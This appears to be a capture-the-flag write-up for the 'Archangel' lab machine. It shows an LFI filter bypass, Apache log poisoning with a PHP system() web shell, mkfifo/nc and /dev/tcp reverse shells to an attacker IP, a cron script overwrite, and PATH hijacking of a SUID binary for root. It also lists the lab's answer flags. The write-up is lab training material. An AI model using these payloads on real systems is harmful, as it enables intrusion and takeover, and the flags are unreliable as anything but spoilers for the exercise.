# Archangel - Easy

1. [Get a shell](#get-a-shell)
2. [Root the machine](#root-the-machine)

## Get a shell

```shell
rustscan -a 10.10.181.119 --range 0-65535 --ulimit 5000 -- -sV

sudo vim /etc/hosts
#map 10.10.181.119 to mafialive.thm

feroxbuster -u http://mafialive.thm -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

#start listener
nc -nvlp 5555
#inject URL-encoded reverse-shell command
#we get reverse shell
id
#www-data

python3 -c 'import pty;pty.spawn("/bin/bash")'

cd /home/archangel

ls -la

cat user.txt
```

```markdown
Open ports & services:

  * 22 - ssh - OpenSSH 7.6p1 (Ubuntu)
  * 80 - http - Apache httpd 2.4.29

While exploring the webpage on port 80, we encounter another hostname named 'mafialive.thm' in the email ID specified.

We can check this hostname by adding it to our /etc/hosts file.

Now, checking <http://mafialive.thm> shows that it is under development; it also gives us flag 1.

We can enumerate this domain using feroxbuster; this gives us a webpage /test.php

/test.php has a button, which, when pressed, shows us a message 'Control is an illusion' from a file on the remote host.

After pressing the button, the URL is:

    /test.php?view=/var/www/html/development_testing/mrrobot.php

We can attempt for LFI here; we can experiment with different payloads using Burp Suite's Repeater.

We can use the payload '/test.php?view=/etc/passwd', but the website does not allow us to do so; we can check the code for test.php to get the logic.

In order to view the code for test.php, we can use LFI payloads using wrappers from PayloadsAllTheThings:

    /test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php

This gives us a base64-encoded string, which when decoded, shows the code for test.php; it also contains flag 2.

In the code, we can see that the function containsStr is used to look for the string '../..' and the presence of the string '/var/www/html/development_testing'

So, we will have to use LFI by repeating slashes, like '..//..//', and go to root directory from /development_testing

Therefore, in order to read /etc/passwd, our payload would be:

    /test.php?view=/var/www/html/development_testing/..//..//..//..//..//etc/passwd

Now, we can get to RCE via LFI; there are multiple articles written on this so we can follow any method - I will be using log poisoning method.

Following LFI payloads to access logs, we can check /var/log/apache2/access.log to get logs.

Now, using Burp Suite, we need to capture a request to /test.php, and modify the User-Agent to have PHP code like `<?php echo ('HELLO THERE!') ?>`

Once we forward this modified request and then check the logs at /var/log/apache2/access.log, we can see that 'HELLO THERE!' is printed. This means it is executing our PHP code.

Now, we can intercept /test.php request again and add `<?php system($_REQUEST['inject']); ?>` to User-Agent.

Then, view the log file again, but this time, add `&inject=ls -la` to end of URL. This will print the directory's contents; we can check this by scrolling to the bottom of the source code.

Now, start listener on attacker and use the following reverse-shell command to be injected at the end of the URL (after URL-encoding it):

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.31.212 5555 >/tmp/f

In a couple of attempts, we get reverse shell on our listener as www-data.
```

```markdown
1. Find a different hostname - mafialive.thm

2. Find flag 1 -  thm{f0und_th3_r1ght_h0st_n4m3} 

3. Look for a page under development - test.php

4. Find flag 2 - thm{explo1t1ng_lf1}

5. Get a shell and find the user flag - thm{lf1_t0_rc3_1s_tr1cky}
```

## Root the machine

```shell
#in archangel home directory
ls -la myfiles

cat myfiles/passwordbackup
#nothing useful

ls -la secret
#we cannot open it

cd /tmp

#get linpeas.sh from attacker machine via python server
wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

cat /etc/crontab

cat /opt/helloworld.sh

echo '#!/bin/bash
sh -i >& /dev/tcp/10.14.31.212/6666 0>&1' > /opt/helloworld.sh

cat /opt/helloworld.sh
#script replaced

#in attacker machine
nc -nvlp 6666
#we will get reverse shell
id
#archangel

cat secret/user2.txt

cat backup
#binary program

cd /tmp

#we can try linpeas once again
wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

#we have to check the backup binary now
cd /home/archangel

cd secret

strings backup
#this uses 'cp' binary

export PATH=/tmp:$PATH

echo $PATH
#/tmp included

echo '#!/bin/bash
bash -i' > /tmp/cp

chmod +x /tmp/cp

#now we can run backup program

./backup
#we are root now

cat /root/root.txt
```

```markdown
After getting user flag, we can prep for privesc.

We can use linpeas.sh to guide us.

Using linpeas.sh, we can see that there is an odd cronjob which runs a script in /opt.

More importantly, the script is run by archangel but www-data has write permissions; so we can edit it.

We can use a one-liner for reverse-shell, and write it to /opt/helloworld.sh; setup listener on attacker machine.

We get reverse shell as archangel; user 2 flag can be read in /secret in home directory.

Using linpeas.sh, we can again attempt for privesc.

From the SUID files section in linpeas, we can see that /secret/backup in home directory has SUID bit set, and more importantly, it is run by root.

Going through the strings in backup binary, we can see that it uses 'cp' binary; therefore, we can exploit this by editing PATH variable and creating 'cp' program on our own.

After creating cp program in /tmp which launches shell as root, and giving it executable permissions, we can execute the backup binary to get root.
```

```markdown
1. Get User 2 flag - thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}

2. Root the machine and find the root flag - thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
```
